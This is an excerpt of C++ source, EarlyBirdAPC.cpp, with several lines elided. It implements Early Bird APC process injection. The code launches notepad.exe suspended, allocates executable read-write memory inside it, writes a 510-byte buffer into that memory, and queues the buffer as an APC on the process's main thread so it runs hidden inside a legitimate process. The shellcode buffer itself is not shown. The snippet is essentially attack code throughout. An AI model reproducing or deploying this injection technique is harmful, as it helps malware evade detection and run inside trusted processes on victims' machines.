// EarlyBirdAPC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
...
int main()
{
	...
	LPSTARTUPINFOW startInfo = new STARTUPINFOW();

	LPCWSTR targetExe = L"C:\\Windows\\System32\\notepad.exe";

	if(!CreateProcess(targetExe, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo))
	{
		std::cout << "Couldn't create process" << std::endl;
	}

	LPVOID remoteAddr = VirtualAllocEx(procInfo->hProcess, NULL, 510, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ...
    BOOL success = WriteProcessMemory(procInfo->hProcess, remoteAddr, buf, 510, NULL);
    ...
    QueueUserAPC((PAPCFUNC)remoteAddr, procInfo->hThread, 0);
